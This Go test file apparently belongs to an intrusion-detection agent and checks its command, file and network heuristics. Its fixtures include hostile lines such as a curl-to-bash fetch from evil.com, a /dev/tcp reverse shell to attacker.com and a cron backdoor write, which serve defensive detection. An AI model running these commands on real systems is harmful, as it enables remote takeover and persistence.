package main

import (
	"testing"
	"time"
)

func TestEvaluateCommandHeuristic(t *testing.T) {
	tests := []struct {
		name         string
		event        Event
		wantMatched  bool
		wantMinConf  float32
		wantCategory string
	}{
		{
			name: "curl pipe bash",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/usr/bin/curl",
				CommandLine: "curl http://evil.com/script.sh | bash",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.7,
			wantCategory: "curl_pipe",
		},
		{
			name: "benign ls",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/bin/ls",
				CommandLine: "ls -la",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  false,
			wantCategory: "command",
		},
		{
			name: "cron tampering",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/bin/bash",
				CommandLine: "bash -c 'echo \"* * * * * /tmp/malware\" > /etc/cron.d/backdoor'",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.6,
			wantCategory: "command",
		},
		{
			name: "crontab -e",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/usr/bin/crontab",
				CommandLine: "crontab -e",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.6,
			wantCategory: "command",
		},
		{
			name: "reverse shell",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "/bin/bash",
				CommandLine: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.7,
			wantCategory: "interactive_shell",
		},
		{
			name: "powershell download",
			event: Event{
				EventType:   EventTypeExecve,
				ImagePath:   "powershell",
				CommandLine: "powershell -enc SQBFAFgAN...",
				ProcessID:   100,
				HostName:    "test",
				Timestamp:   time.Now(),
			},
			wantMatched:  true,
			wantMinConf:  0.7,
			wantCategory: "powershell",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateCommandHeuristic(tt.event, nil)
			if result.Matched != tt.wantMatched {
				t.Errorf("matched = %v, want %v (reason: %s)", result.Matched, tt.wantMatched, result.Reason)
			}
			if result.Matched && result.Confidence < tt.wantMinConf {
				t.Errorf("confidence = %.2f, want >= %.2f", result.Confidence, tt.wantMinConf)
			}
			if result.Category != tt.wantCategory {
				t.Errorf("category = %q, want %q", result.Category, tt.wantCategory)
			}
		})
	}
}

func TestEvaluateFileHeuristic(t *testing.T) {
	tests := []struct {
		name        string
		event       Event
		wantMatched bool
		wantMinConf float32
	}{
		{
			name: "write to /etc/shadow",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/etc/shadow",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.9,
		},
		{
			name: "write to /etc/passwd",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/etc/passwd",
				FileFlags: "O_RDWR",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.9,
		},
		{
			name: "read /etc/passwd",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/etc/passwd",
				FileFlags: "O_RDONLY",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.9,
		},
		{
			name: "write to ssh authorized_keys",
			event: Event{
				EventType: EventTypeOpenat,
				FilePath:  "/home/user/.ssh/authorized_keys",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.9,
		},
		{
			name: "create file in /tmp",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/tmp/malware.sh",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.5,
		},
		{
			name: "write to /var/log/syslog",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/var/log/syslog",
				FileFlags: "O_WRONLY",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.7,
		},
		{
			name: "benign read from /home",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/home/user/documents/file.txt",
				FileFlags: "O_RDONLY",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: false,
		},
		{
			name: "benign write to /home",
			event: Event{
				EventType: EventTypeOpen,
				FilePath:  "/home/user/output.txt",
				FileFlags: "O_WRONLY|O_CREAT",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: false,
		},
		{
			name: "write to /etc/ssh/sshd_config",
			event: Event{
				EventType: EventTypeOpenat,
				FilePath:  "/etc/ssh/sshd_config",
				FileFlags: "O_RDWR",
				ProcessID: 100,
				HostName:  "test",
				Timestamp: time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.8,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateFileHeuristic(tt.event, nil)
			if result.Matched != tt.wantMatched {
				t.Errorf("matched = %v, want %v (reason: %s)", result.Matched, tt.wantMatched, result.Reason)
			}
			if result.Matched && result.Confidence < tt.wantMinConf {
				t.Errorf("confidence = %.2f, want >= %.2f (reason: %s)", result.Confidence, tt.wantMinConf, result.Reason)
			}
		})
	}
}

func TestEvaluateNetworkHeuristic(t *testing.T) {
	tests := []struct {
		name        string
		event       Event
		wantMatched bool
		wantMinConf float32
	}{
		{
			name: "connect to netcat port 4444",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "10.0.0.1",
				RemotePort: 4444,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.6,
		},
		{
			name: "connect to Back Orifice port 31337",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "10.0.0.1",
				RemotePort: 31337,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.6,
		},
		{
			name: "connect to common port 80",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "93.184.216.34",
				RemotePort: 80,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: false,
		},
		{
			name: "connect to port 5555",
			event: Event{
				EventType:  EventTypeConnect,
				RemoteAddr: "192.168.1.100",
				RemotePort: 5555,
				ProcessID:  100,
				HostName:   "test",
				Timestamp:  time.Now(),
			},
			wantMatched: true,
			wantMinConf: 0.6,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateNetworkHeuristic(tt.event, nil)
			if result.Matched != tt.wantMatched {
				t.Errorf("matched = %v, want %v (reason: %s)", result.Matched, tt.wantMatched, result.Reason)
			}
			if result.Matched && result.Confidence < tt.wantMinConf {
				t.Errorf("confidence = %.2f, want >= %.2f", result.Confidence, tt.wantMinConf)
			}
		})
	}
}

func TestEvaluateNetworkWithServerParent(t *testing.T) {
	cache := NewProcessCache(100)
	cache.Record(Event{
		ProcessGUID: "host-nginx-1000",
		ProcessID:   1000,
		ImagePath:   "/usr/sbin/nginx",
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	event := Event{
		EventType:  EventTypeConnect,
		ParentGUID: "host-nginx-1000",
		RemoteAddr: "10.0.0.99",
		RemotePort: 8080,
		ProcessID:  2000,
		HostName:   "test",
		Timestamp:  time.Now(),
	}

	result := evaluateNetworkHeuristic(event, cache)
	if !result.Matched {
		t.Error("expected match for connection from server process")
	}
	if result.Confidence < 0.5 {
		t.Errorf("confidence = %.2f, want >= 0.5", result.Confidence)
	}
}

func TestEvaluateCommandWithServiceSpawningShell(t *testing.T) {
	cache := NewProcessCache(100)
	cache.Record(Event{
		ProcessGUID: "host-nginx-500",
		ProcessID:   500,
		ImagePath:   "/usr/sbin/nginx",
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	event := Event{
		EventType:   EventTypeExecve,
		ParentGUID:  "host-nginx-500",
		ImagePath:   "/bin/bash",
		CommandLine: "bash -c 'ls'",
		ProcessID:   600,
		HostName:    "test",
		Timestamp:   time.Now(),
	}

	result := evaluateCommandHeuristic(event, cache)
	if !result.Matched {
		t.Error("expected match for nginx spawning bash (not in allowlist)")
	}
	if result.Confidence < 0.7 {
		t.Errorf("confidence = %.2f, want >= 0.7", result.Confidence)
	}
}

func TestSshdSpawningShellAllowed(t *testing.T) {
	cache := NewProcessCache(100)
	cache.Record(Event{
		ProcessGUID: "host-sshd-500",
		ProcessID:   500,
		ImagePath:   "/usr/sbin/sshd",
		HostName:    "test",
		Timestamp:   time.Now(),
	})

	event := Event{
		EventType:   EventTypeExecve,
		ParentGUID:  "host-sshd-500",
		ImagePath:   "/bin/bash",
		CommandLine: "bash -c 'ls'",
		ProcessID:   600,
		HostName:    "test",
		Timestamp:   time.Now(),
	}

	result := evaluateCommandHeuristic(event, cache)
	for _, a := range result.Actions {
		if a.ActionType == ActionKillPID {
			t.Errorf("ssh->bash should be allowed, but got KILL action: %s", a.Reason)
		}
	}
}

func TestEvaluateHeuristicDispatch(t *testing.T) {
	tests := []struct {
		name    string
		event   Event
		wantCat string
	}{
		{"execve dispatch", Event{EventType: EventTypeExecve, CommandLine: "curl http://x|bash", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "curl_pipe"},
		{"open dispatch", Event{EventType: EventTypeOpen, FilePath: "/etc/shadow", FileFlags: "O_WRONLY", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "credential_read"},
		{"openat dispatch", Event{EventType: EventTypeOpenat, FilePath: "/etc/passwd", FileFlags: "O_RDWR", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "credential_read"},
		{"connect dispatch", Event{EventType: EventTypeConnect, RemotePort: 4444, RemoteAddr: "1.2.3.4", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "c2_default"},
		{"unknown type", Event{EventType: "something_else"}, ""},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := evaluateHeuristic(tt.event, nil)
			if result.Category != tt.wantCat {
				t.Errorf("category = %q, want %q", result.Category, tt.wantCat)
			}
		})
	}
}

func TestIsCronTampering(t *testing.T) {
	tests := []struct {
		cmd      string
		expected bool
	}{
		{"bash -c 'echo * * * * * /tmp/x > /etc/cron.d/backdoor'", true},
		{"crontab -e", true},
		{"echo job > /var/spool/cron/user", true},
		{"cat /etc/crontab", false},
		{"ls -la", false},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			if got := isCronTampering(tt.cmd); got != tt.expected {
				t.Errorf("isCronTampering(%q) = %v, want %v", tt.cmd, got, tt.expected)
			}
		})
	}
}

func TestIsTempPath(t *testing.T) {
	tests := []struct {
		path     string
		expected bool
	}{
		{"/tmp/malware.sh", true},
		{"/var/tmp/payload", true},
		{"/dev/shm/run", true},
		{"/home/user/file", false},
		{"/opt/app/bin", false},
	}

	for _, tt := range tests {
		if got := isTempPath(tt.path); got != tt.expected {
			t.Errorf("isTempPath(%q) = %v, want %v", tt.path, got, tt.expected)
		}
	}
}
